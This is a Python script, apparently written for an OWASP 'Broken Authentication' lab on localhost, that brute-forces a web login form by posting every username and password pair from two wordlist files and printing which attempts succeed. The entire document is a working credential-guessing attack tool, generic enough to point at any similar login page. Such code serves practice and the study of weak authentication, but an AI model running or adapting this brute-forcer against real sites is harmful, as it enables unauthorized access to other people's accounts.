import os
import requests
import re

def check(username, password, url):
	flag = '<form action="#" id="main-form" method="POST">'

	data = {
		'username' : username,
		'login' : password,
		'submit' : 'Log In'
	}

	s = requests.session();

	response = s.post(url, data = data)

	if re.findall(flag, response.text) :
		print(username + '-' + password + '-->' 'fail')
	else :
		print(username + '-' + password + '-->' 'sucess')
	




if __name__ == '__main__' :
	url = 'http://localhost/php/A2_2017_Broken%20Authentication/Broken_Authentication/index.php'

	fileu = open('wu.txt', 'r')
	filep = open('wp.txt', 'r')

	lenghtu = os.fstat(fileu.fileno()).st_size
	lenghtp = os.fstat(filep.fileno()).st_size

	while (fileu.tell() != lenghtu):
		username = fileu.readline()
		user = username.strip()
		while (filep.tell() != lenghtp):
			password = filep.readline()
			pa = password.strip()
			check(user, pa, url)
		if fileu.tell() != lenghtu and filep.tell() == lenghtp:
			filep.seek(0,0)
